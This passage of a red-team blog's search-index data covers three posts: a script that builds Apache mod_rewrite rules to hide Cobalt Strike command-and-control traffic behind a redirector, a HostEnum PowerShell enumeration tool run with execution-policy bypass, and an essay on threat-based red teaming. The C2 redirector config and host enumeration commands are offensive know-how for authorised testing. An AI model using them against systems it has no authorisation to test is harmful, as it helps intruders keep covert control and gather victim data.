start from a known good.","title":"Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#highlights-of-cs2modrewritepy","text":"Rewrite Rules based on valid C2 URIs (HTTP GET, POST, and Stager) and specified User-Agent string. Result : Only requests to valid C2 URIs with a specified UA string will be proxied to the Team Server by default. Uses a custom Malleable C2 profile to build a .htaccess file with corresponding mod_rewrite rules Supports the most recent Cobalt Strike 3.10 profile features HTTP or HTTPS proxying to the Cobalt Strike Team Server HTTP 302 Redirection to a Legitimate Site for Non-Matching Requests","title":"Highlights of cs2modrewrite.py"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#quick-start","text":"","title":"Quick Start"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#usage","text":"The script can be found at: github - cs2modrewrite","title":"Usage"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#arguments","text":"1 2 3 4 5 6 7 8 9 10 11 cs2modrewrite . py [ - h ] [ - i INPUTFILE ] [ - c C2SERVER ] [ - d DESTINATION ] Converts Cobalt Strike profiles to Apache mod_rewrite . htaccess file format by using the User - Agent and URI Endpoint to create rewrite rules . Make sure the profile passes a c2lint check before running this sript . optional arguments : - h , -- help show this help message and exit - i INPUTFILE C2 Profile file - c C2SERVER C2 Server ( http : // teamserver ) - d DESTINATION ( Optional ) Redirect to this URL ( http : // google . com )","title":"Arguments"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#example-output","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #### Save the following as . htaccess in the root web directory ######################################## ## . htaccess START RewriteEngine On ## ( Optional ) ## Scripted Web Delivery ## Uncomment and adjust as needed # RewriteCond % { REQUEST_URI } ^/ css / style1 . css ?$ # RewriteCond % { HTTP_USER_AGENT } ^ $ # RewriteRule ^ . * $ \" http://TEAMSERVER%{REQUEST_URI} \" [ P , L ] ## Default Beacon Staging Support ( / 1234 ) RewriteCond % { REQUEST_URI } ^/ .... / ?$ RewriteCond % { HTTP_USER_AGENT } \" Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08 \" RewriteRule ^ . * $ \" http://TEAMSERVER%{REQUEST_URI} \" [ P , L ] ## C2 Traffic ( HTTP - GET , HTTP - POST , HTTP - STAGER URIs ) ## Logic : If a requested URI AND the User - Agent matches , proxy the connection to the Teamserver ## Consider adding other HTTP checks to fine tune the check . ( HTTP Cookie , HTTP Referer , HTTP Query String , etc ) ## Refer to http : // httpd . apache . org / docs / current / mod / mod_rewrite . html ## Profile URIs RewriteCond % { REQUEST_URI } ^ ( / include / template / isx . php . *|/ wp06 / wp - includes / po . php . *|/ wp08 / wp - includes / dtcla . php . *|/ modules / mod_search . php . *|/ blog / wp - includes / pomo / src . php . *|/ includes / phpmailer / class . pop3 . php . *|/ api / 516280565958 . *|/ api / 516280565959 . * ) $ ## Profile UserAgent RewriteCond % { HTTP_USER_AGENT } \" Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08 \" RewriteRule ^ . * $ \" https://TEAMSERVER%{REQUEST_URI} \" [ P , L ] ## Redirect all other traffic here RewriteRule ^ . * $ HTTPS : // GOHERE / ? [ L , R = 302 ] ## . htaccess END ########################################","title":"Example Output"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#what-does-this-htaccess-do","text":"","title":"What does this .htaccess do?"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#staging","text":"When Apache receives an HTTP request with the User-Agent Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_080 and a 4 character URI, it proxies the traffic to the teamserver.","title":"Staging"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#c2-traffic","text":"When Apache receives an HTTP request with the User-Agent Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_080 and one of the following URIs ( / include / template / isx . php . _ |/ wp06 / wp - includes / po . php . _ |/ wp08 / wp - includes / dtcla . php , / modules / mod_search . php , / blog / wp - includes / pomo / src . php , / includes / phpmailer / class . pop3 . php , / api / 516280565958 , / api / 516280565959 ) it proxies the traffic to the teamserver.","title":"C2 Traffic"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#catch-all","text":"Any traffic that doesn't match a rule redirects the request using an HTTP 302","title":"Catch All"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#summary","text":"TLDR The python script cs2modrewrite.py automates the process of creating a Malleable C2 compatible .htaccess file for intelligent redirection with Apache mod_rewrite. Try it out and feel free to give feedback and suggestions at @joevest on Twitter and on the ThreatExpress GitHub repo . For more details on developing C2 architecture, check out the Red Team Infrastructure Wiki .","title":"Summary"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#references","text":"https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/ https://twitter.com/bluscreenofjeff https://github.com/threatexpress/cs2modrewrite https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki","title":"References"},{"location":"blogs/2018/hostenum-updates-usage/","text":"HostEnum: Updates and Usage Guide \u00b6 Andrew Chiles | January 10, 2018 | Tweet This Post: HostEnum (formerly Invoke-HostEnum) has received some much needed attention in recent weeks and a new version is now available on the ThreatExpress Github (formerly https://www.github.com/minisllc ). I've renamed the tool to simply HostEnum since it's actually a large collection of enumeration functions which are now individually called by the Invoke-HostEnum wrapper function. It's designed to provide a quick means of generating a comprehensive system profile and I've found it extremely useful for both offensive and defensive perspectives. Recent improvements include a breakout of enumeration functions, a transition from string output to objects for improved formatting and reporting capabilities, new enumeration checks, and addition of privilege escalation checks from @harmj0y's PowerUp . Recent Updates \u00b6 Changed function outputs to PS objects vs strings (mostly) Greatly improved HTML reporting Removed remaining Windows binary dependencies (primarily netstat.exe and net.exe) Added -Quick switch to perform a brief system survey Added -Privesc switch to perform PowerUp checks Added -All switch to perform Local, Domain, and Privesc checks Added firewall configuration enumeration Added well-known AV process detection Added retrieval of mapped network shares Function Breakout \u00b6 Most enumeration functions are now individually callable after loading the script. This means if you're only interested in what AV processes are running, you can call the Get-AVInfo and Get-AVProcesses functions rather than running the entire script or modifying the code. The following is a subset of the functions and excludes ones specific to PowerUp (although they are also directly callable). Invoke-HostEnum Get-SysInfo Get-ProcessInfo Get-GroupMembership Get-ActiveTCPConnections Get-ActiveListeners Get-FirewallStatus Get-InterestingRegistryKeys Get-IndexedFiles Get-InterestingFiles Get-RecycleBin Get-AVInfo Get-McafeeLogs Get-AVProcesses Get-DomainAdmins Get-DomainAccountPolicy Get-BrowserInformation Get-ChromeHistory Get-ChromeBookmarks Get-InternetExplorerHistory Get-InternetExplorerBookmarks Get-FirefoxHistory Get-ActiveIEURLS Get-UserSPNS Usage \u00b6 Execute locally hosted script in \"Quick\" mode with console output. 1 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - Quick Execute locally hosted script with HTML report output. If you want the most readable format and don't mind writing a file to disk, consider using the \"-HTMLReport\" option to create a report in the current directory. 1 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - Local - HTMLReport Execute all checks (equivalent to running -Local -Domain -Privesc) and save results as an HTML report. 1 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - All - HTMLReport Perform a quick \"sysinfo\" like check via the Get-SystemInfo function. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Get-SysInfo HOSTNAME : WIN7X64 OS : Microsoft Windows 7 Enterprise Service Pack 1 ARCHITECTURE : 64 - bit DATE ( UTC ) : 20180110132636 DATE ( LOCAL ) : 20180110072636 - 06 INSTALLDATE : 20160121100103 . 000000 - 360 UPTIME : 0 Days , 0 Hours , 47 Minutes , 55 Seconds IPADDRESSES : fe80 :: b59e : 1735 : dddf : d132 % 11 , 192 . 168 . 15 . 10 DOMAIN : WORKGROUP USERNAME : User LOGONSERVER : \\ WIN7X64 PSVERSION : 2 . 0 PSSCRIPTBLOCKLOGGING : Enabled PSTRANSCRIPTION : Disabled PSTRANSCRIPTIONDIR : I highly recommend utilizing the -HTMLReport switch whenever possible as this is the best way to view the resulting data. Alternatively you could execute any command and pipe to Out-String and Set-Content to redirect the console output if you just want text. You can still monitor execution status with the -Verbose switch. 1 2 3 4 5 6 7 8 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - Verbose - All | Out - String | Set - Content $ env : USERPROFILEresults . txt VERBOSE : Performing quick enumeration ... VERBOSE : Enumerating running processes ... VERBOSE : Enumerating installed AV product ... VERBOSE : Enumerating potential AV processes ... VERBOSE : Enumerating active network connections ... VERBOSE : Enumerating current user local group membership ... Wrap-Up \u00b6 I'm always looking for ideas of new enumeration techniques and data to capture so please feel free to make comments and suggestions on the GitHub repo or contact me at @andrewchiles on Twitter. Try HostEnum on an upcoming engagement and let me know what other information would be useful to you regarding the environments you encounter.","title":"HostEnum - Updates and Usage Guide"},{"location":"blogs/2018/hostenum-updates-usage/#hostenum-updates-and-usage-guide","text":"Andrew Chiles | January 10, 2018 | Tweet This Post: HostEnum (formerly Invoke-HostEnum) has received some much needed attention in recent weeks and a new version is now available on the ThreatExpress Github (formerly https://www.github.com/minisllc ). I've renamed the tool to simply HostEnum since it's actually a large collection of enumeration functions which are now individually called by the Invoke-HostEnum wrapper function. It's designed to provide a quick means of generating a comprehensive system profile and I've found it extremely useful for both offensive and defensive perspectives. Recent improvements include a breakout of enumeration functions, a transition from string output to objects for improved formatting and reporting capabilities, new enumeration checks, and addition of privilege escalation checks from @harmj0y's PowerUp .","title":"HostEnum: Updates and Usage Guide"},{"location":"blogs/2018/hostenum-updates-usage/#recent-updates","text":"Changed function outputs to PS objects vs strings (mostly) Greatly improved HTML reporting Removed remaining Windows binary dependencies (primarily netstat.exe and net.exe) Added -Quick switch to perform a brief system survey Added -Privesc switch to perform PowerUp checks Added -All switch to perform Local, Domain, and Privesc checks Added firewall configuration enumeration Added well-known AV process detection Added retrieval of mapped network shares","title":"Recent Updates"},{"location":"blogs/2018/hostenum-updates-usage/#function-breakout","text":"Most enumeration functions are now individually callable after loading the script. This means if you're only interested in what AV processes are running, you can call the Get-AVInfo and Get-AVProcesses functions rather than running the entire script or modifying the code. The following is a subset of the functions and excludes ones specific to PowerUp (although they are also directly callable). Invoke-HostEnum Get-SysInfo Get-ProcessInfo Get-GroupMembership Get-ActiveTCPConnections Get-ActiveListeners Get-FirewallStatus Get-InterestingRegistryKeys Get-IndexedFiles Get-InterestingFiles Get-RecycleBin Get-AVInfo Get-McafeeLogs Get-AVProcesses Get-DomainAdmins Get-DomainAccountPolicy Get-BrowserInformation Get-ChromeHistory Get-ChromeBookmarks Get-InternetExplorerHistory Get-InternetExplorerBookmarks Get-FirefoxHistory Get-ActiveIEURLS Get-UserSPNS","title":"Function Breakout"},{"location":"blogs/2018/hostenum-updates-usage/#usage","text":"Execute locally hosted script in \"Quick\" mode with console output. 1 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - Quick Execute locally hosted script with HTML report output. If you want the most readable format and don't mind writing a file to disk, consider using the \"-HTMLReport\" option to create a report in the current directory. 1 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - Local - HTMLReport Execute all checks (equivalent to running -Local -Domain -Privesc) and save results as an HTML report. 1 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - All - HTMLReport Perform a quick \"sysinfo\" like check via the Get-SystemInfo function. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Get-SysInfo HOSTNAME : WIN7X64 OS : Microsoft Windows 7 Enterprise Service Pack 1 ARCHITECTURE : 64 - bit DATE ( UTC ) : 20180110132636 DATE ( LOCAL ) : 20180110072636 - 06 INSTALLDATE : 20160121100103 . 000000 - 360 UPTIME : 0 Days , 0 Hours , 47 Minutes , 55 Seconds IPADDRESSES : fe80 :: b59e : 1735 : dddf : d132 % 11 , 192 . 168 . 15 . 10 DOMAIN : WORKGROUP USERNAME : User LOGONSERVER : \\ WIN7X64 PSVERSION : 2 . 0 PSSCRIPTBLOCKLOGGING : Enabled PSTRANSCRIPTION : Disabled PSTRANSCRIPTIONDIR : I highly recommend utilizing the -HTMLReport switch whenever possible as this is the best way to view the resulting data. Alternatively you could execute any command and pipe to Out-String and Set-Content to redirect the console output if you just want text. You can still monitor execution status with the -Verbose switch. 1 2 3 4 5 6 7 8 powershell - ep bypass - c Import - Module . / HostEnum . ps1 ; Invoke - HostEnum - Verbose - All | Out - String | Set - Content $ env : USERPROFILEresults . txt VERBOSE : Performing quick enumeration ... VERBOSE : Enumerating running processes ... VERBOSE : Enumerating installed AV product ... VERBOSE : Enumerating potential AV processes ... VERBOSE : Enumerating active network connections ... VERBOSE : Enumerating current user local group membership ...","title":"Usage"},{"location":"blogs/2018/hostenum-updates-usage/#wrap-up","text":"I'm always looking for ideas of new enumeration techniques and data to capture so please feel free to make comments and suggestions on the GitHub repo or contact me at @andrewchiles on Twitter. Try HostEnum on an upcoming engagement and let me know what other information would be useful to you regarding the environments you encounter.","title":"Wrap-Up"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/","text":"Threat Gets A Vote: Applying a Threat-Based Approach to Security Testing \u00b6 Joe Vest | June 04, 2018 | Tweet This Post: Designing, deploying, and managing a comprehensive security program is not an easy task. An organization's security design is influenced and pressured from multiple, often competing, sources. This includes customers, compliance, management, peers, budget, public opinion, and news. This process is complex and challenging, but an organization is generally able to overcome the pressures and implement what is considered to be a robust security program. An organization is able to please the various parties and, at least on paper, describe a strong security program designed to stop malicious cyber-attacks. Audit and compliance checks pass with a green light. Robust patch management systems are deployed. Vulnerability assessments and penetration tests are conducted. In general, the organization has good security hygiene. These are all great steps in defending a network from attack, but unfortunately, often fall short in achieving the primary goal of preventing, detecting, and responding to real threats. Why? What is missing? The real question to consider is: Are organizations really building security programs designed to address the threat? This post dives into the shortcomings of security operations design, implementation, and testing and how applying a threat-based security testing program can reduce these gaps to ultimately improve the state of security. A security program includes many components; staff, policy, tools, management, oversight, incident response to name a few. The program is built by including members of several different divisions. Each contribute their security requirements to ultimately design and build the program. This is a great, but what, or better who, is often missing from this strategy? Has anyone on the team ever seen a bad guy? Is the threat really included in security planning? \u00b6 Good intentions by a group of intelligent people do not add up to understanding threats or how they operate. If the goal of security operations is to prevent, detect, respond, and recover to malicious actions, it only makes sense to include the opinions of those who you are defending against. Unfortunately, the threat or threat perspective is often excluded from security design. This omission can lead to the mitigation or acceptance of risks not fully understood or revealed from traditional security testing and auditing. This can lead to a serious false sense of security. A real threat knows this and uses it to their advantage. Consider the following. Does a threat know a target has a robust security program? Do threats perform actions that will trigger an alert or get them caught? Are threats still successful? If so, why are threats able to successfully achieve their goals and negatively impact an organization that has a comprehensive security program? To understand this, we need to know what we are defending against. The security industry uses the term threat, but... What is a threat? \u00b6 Dictionary.com 1 defines threat as: a declaration of an intention or determination to inflict punishment, injury, etc., in retaliation for, or conditionally upon, some action or course; menace an indication or warning of probable trouble a person or thing that threatens. ISO 27001 2 defines threat as: A potential cause of an incident, that may result in harm of systems and organization NIST 3 defines threat as: Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service. | To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks. Why do Threats Succeed? \u00b6 Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack. Why bother with a new threat focused approach? Isn't the identification and mitigation of vulnerabilities enough? \u00b6 In order to answer, you must understand how a threat-actor thinks and acts. Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -> exploit -> profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in un-actionable default or vendor generate logs and alerts. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice? Organizations are still missing a key piece to all threats; understanding their actions and TTPs. Consider this scenario \u00b6 After evaluating a target network, a threat-actor decides phishing is their chosen method to gain access. A phish is sent to a small number of people. The phish contains an excel attachment with a DDE 4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network. Is this scenario reasonable? Were opportunities presented to detect or prevent the threat? Organizations often blame the end user who clicked the link. What about the actions taken after the initial click? This scenario indicates an organization's entire security model may depend on users not clicking a link in an email. The organization does not intend to hinge all security on a single user, but the actions taken to defend their systems often say otherwise. Why is this scenario successful? \u00b6 Organizations often have the wrong mindset to security defense Users are blamed for clicking links Policies, procedures, and compliance measure security Log everything (You never know what you need) Patch, patch, patch. Threats only use exploits Our security tools will save use These can be valuable actions that reduce the attack surface, but an intelligent threat-actor knows this. Instead of only focusing on actions that impact the attack surface, organizations need to include a focus on threat TTPs. This does not mean focusing on a specific threat-actor. Whether the threat-actor is script kiddie or an APT, both will execute a series of steps (TTPs) to impact an organization. This is the key. Focusing on defending against TTPs combined with good security practices that reduce the attack surface is the most effective way to directly impact a threat-actor's ability to operate. A Threat Will\u2026 \u00b6 To keep it simple, a threat-actor must Get-In to establish an initial foothold. This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once. A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition of Red Teaming Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT . Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate. PDRR (Protect, Detect, Respond, Recover) Coverage \u00b6 The NIST CyberSecurity Framework 6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to: Describe their current cybersecurity posture; Describe their target state for cybersecurity; Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process; Assess progress toward the target state; Communicate among internal and external stakeholders about cybersecurity risk. The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory. For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components . What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect , Detect , Respond , and Recover against a threat. Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event. Detect \u2013 The Detect function enables the timely discovery of cybersecurity events. Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident. Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident. Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection. The following illustrates the PDRR coverage of different assessment types. \u00b6 When an organization is ready to understand the negative impacts caused by a threat-actor, a professional red team is used to provide the required threat emulation and stimulus. A professional red team has the ability to emulate a threat-actors TTPs in order to stimulate and engage security defenders against a realistic threat. Red teams may identify vulnerabilities and exploits, but these are only a means to an end. Red teams focus on engagement goals. This engages an organization with a realistic attack to better understand how they are able to impact a threat's ability to operate or cause negative impacts to the organization. Red teams can emulate realistic TTPs through research and experience. Much of this information has been complied in to a framework (ATT&CK) and organizations can use this to help measure their ability to defend against specific TTPs. MITRE's Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK\u2122) 7 is a knowledge base and model for cyber threat behavior. ATT&CK is useful for understanding security risk against known threat behavior, for planning security improvements, and verifying defenses work as expected. ATT&CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against the various TTPs. ATT&CK is broken into Tactics, Techniques, and Procedures. Tactics are the tactical goals a threat may use during an operation. Techniques describe the actions threats take to achieve their objectives. Procedures are the technical steps required to perform the action. This provides a classification of all threat actions regardless of the underlying vulnerabilities. Security operations can use this as a roadmap or scorecard to measure the ability to protect, detect, respond, and recover from a threat. Security program development should include the threat during design and development. Organizations should continue to build and manage a comprehensive security program designed to reduce the attack surface; however, must include Blue TTPs that directly impact the threat. Organizations should use red teams to provide threat faithful stimulus to train blue teams or measure security operations as a whole. Simple measurements are often missed in traditional security testing, but are core to red team engagements. Red teaming can provide answers to question like; Questions What ability does a threat have to laterally move throughout a network? What ability does a threat have to escalate privileges? What ability does a threat have to exfiltrate sensitive data? Can a threat degrade, disrupt, deny, or destroy operations? In addition to these simple questions, red teams and blue teams can use the MITRE ATT&CK Framework as a tool to measure blue's ability to defend against threat TTPs. References \u00b6 Threat Definition, Dictionary.com, http://www.dictionary.com/browse/threat Threat Definition, ISO 27001, http://www.praxiom.com/iso-27001-definitions.htm#Threat Threat Definition, NIST, https://csrc.nist.gov/Glossary/?term=2156 Reviving DDE: Using OneNote and Excel for Code Execution, https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee NIST Cybersecurity Framework, https://www.nist.gov/cyberframework/csf-reference-tool MITRE ATT&CK Framework, https://attack.mitre.org/wiki/Main_Page","title":"Threat Get's a Vote - Applying a Threat-Based Approach to Security Testing"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing","text":"Joe Vest | June 04, 2018 | Tweet This Post: Designing, deploying, and managing a comprehensive security program is not an easy task. An organization's security design is influenced and pressured from multiple, often competing, sources. This includes customers, compliance, management, peers, budget, public opinion, and news. This process is complex and challenging, but an organization is generally able to overcome the pressures and implement what is considered to be a robust security program. An organization is able to please the various parties and, at least on paper, describe a strong security program designed to stop malicious cyber-attacks. Audit and compliance checks pass with a green light. Robust patch management systems are deployed. Vulnerability assessments and penetration tests are conducted. In general, the organization has good security hygiene. These are all great steps in defending a network from attack, but unfortunately, often fall short in achieving the primary goal of preventing, detecting, and responding to real threats. Why? What is missing? The real question to consider is: Are organizations really building security programs designed to address the threat? This post dives into the shortcomings of security operations design, implementation, and testing and how applying a threat-based security testing program can reduce these gaps to ultimately improve the state of security. A security program includes many components; staff, policy, tools, management, oversight, incident response to name a few. The program is built by including members of several different divisions. Each contribute their security requirements to ultimately design and build the program. This is a great, but what, or better who, is often missing from this strategy? Has anyone on the team ever seen a bad guy?","title":"Threat Gets A Vote: Applying a Threat-Based Approach to Security Testing"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#is-the-threat-really-included-in-security-planning","text":"Good intentions by a group of intelligent people do not add up to understanding threats or how they operate. If the goal of security operations is to prevent, detect, respond, and recover to malicious actions, it only makes sense to include the opinions of those who you are defending against. Unfortunately, the threat or threat perspective is often excluded from security design. This omission can lead to the mitigation or acceptance of risks not fully understood or revealed from traditional security testing and auditing. This can lead to a serious false sense of security. A real threat knows this and uses it to their advantage. Consider the following. Does a threat know a target has a robust security program? Do threats perform actions that will trigger an alert or get them caught? Are threats still successful? If so, why are threats able to successfully achieve their goals and negatively impact an organization that has a comprehensive security program? To understand this, we need to know what we are defending against. The security industry uses the term threat, but...","title":"Is the threat really included in security planning?"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#what-is-a-threat","text":"Dictionary.com 1 defines threat as: a declaration of an intention or determination to inflict punishment, injury, etc., in retaliation for, or conditionally upon, some action or course; menace an indication or warning of probable trouble a person or thing that threatens. ISO 27001 2 defines threat as: A potential cause of an incident, that may result in harm of systems and organization NIST 3 defines threat as: Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service. | To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks.","title":"What is a threat?"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-do-threats-succeed","text":"Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack. Why bother with a new threat focused approach?","title":"Why do Threats 